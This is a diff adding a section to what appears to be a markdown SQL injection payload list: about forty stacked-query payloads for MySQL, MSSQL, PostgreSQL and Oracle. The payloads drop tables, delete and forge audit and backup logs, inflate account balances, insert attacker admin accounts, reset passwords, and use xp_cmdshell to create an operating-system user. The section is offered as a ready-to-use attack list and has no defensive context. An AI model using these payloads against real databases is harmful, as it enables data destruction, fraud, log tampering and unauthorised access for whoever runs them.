@@ -389,3 +389,54 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 
 ---
 
+## 📋 Stacked Queries SQLi Payloads
+
+### MySQL
+- `' ; DROP TABLE users; --`
+- `' ; CREATE TABLE attacker (id INT, data VARCHAR(100)); --`
+- `' ; INSERT INTO attacker (id, data) VALUES (1, 'malicious_data'); --`
+- `' ; UPDATE orders SET status='shipped' WHERE id=1; INSERT INTO logs (event) VALUES ('Order tampered') --`
+- `' ; DELETE FROM logs WHERE id=5; INSERT INTO logs (event) VALUES ('Logs manipulated') --`
+- `' ; ALTER TABLE users ADD COLUMN hacked BOOLEAN; --`
+- `' ; UPDATE users SET hacked=1 WHERE username='admin'; --`
+- `' ; INSERT INTO transactions (id, amount) VALUES (100, 999999); --`
+- `' ; DELETE FROM audit_logs WHERE id=42; INSERT INTO audit_logs (event) VALUES ('Audit Cleared') --`
+- `' ; INSERT INTO malicious_data (info) VALUES ('Exfiltrated Data') --`
+
+### MSSQL
+- `' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE --`
+- `' ; EXEC xp_cmdshell 'net user hacker hacker123 /add' --`
+- `' ; INSERT INTO sensitive_data (username, password) VALUES ('attacker', 'password123') --`
+- `' ; UPDATE finance SET balance=99999 WHERE username='admin' --`
+- `' ; INSERT INTO events (event_type) VALUES ('Malicious Activity') --`
+- `' ; DELETE FROM logs WHERE id=9; INSERT INTO logs (event) VALUES ('Log Cleared') --`
+- `' ; EXEC sp_password 'admin','attacker123' --`
+- `' ; EXEC sp_attach_db 'malicious_db','C:\\malicious_data.bak' --`
+- `' ; INSERT INTO admin_data (user, role) VALUES ('attacker', 'superuser') --`
+- `' ; UPDATE accounts SET status='compromised' WHERE id=1 --`
+
+### PostgreSQL
+- `' ; CREATE TABLE attacker (id SERIAL, data TEXT); --`
+- `' ; INSERT INTO attacker (data) VALUES ('Injected Content') --`
+- `' ; DELETE FROM users WHERE username='admin'; INSERT INTO users (username, password) VALUES ('attacker', 'password123') --`
+- `' ; UPDATE finance SET balance=999999 WHERE username='admin' --`
+- `' ; COPY users TO '/var/www/html/malware.php' --`
+- `' ; INSERT INTO transactions (amount) VALUES (999999) --`
+- `' ; ALTER TABLE accounts ADD COLUMN hacked BOOLEAN; --`
+- `' ; INSERT INTO secure_logs (message) VALUES ('Malicious Entry') --`
+- `' ; INSERT INTO records (data) VALUES ('Confidential Data') --`
+- `' ; INSERT INTO files (content) VALUES ('Payload Delivered') --`
+
+### Oracle
+- `' ; CREATE TABLE attacker (id NUMBER, data VARCHAR2(100)); --`
+- `' ; INSERT INTO attacker (data) VALUES ('Exploit Data') --`
+- `' ; DELETE FROM users WHERE username='target'; INSERT INTO users (username, password) VALUES ('attacker', 'pwned') --`
+- `' ; UPDATE accounts SET balance=999999 WHERE id=1 --`
+- `' ; INSERT INTO sensitive_logs (event) VALUES ('Exfiltration Success') --`
+- `' ; INSERT INTO admin_data (username, role) VALUES ('attacker', 'sysadmin') --`
+- `' ; DELETE FROM backups WHERE id=5; INSERT INTO backups (event) VALUES ('Backups Tampered') --`
+- `' ; INSERT INTO audit_logs (content) VALUES ('Altered Log') --`
+- `' ; INSERT INTO access_logs (ip) VALUES ('192.168.1.1') --`
+- `' ; UPDATE secure_data SET unlocked=1 WHERE username='admin' --`
+
+
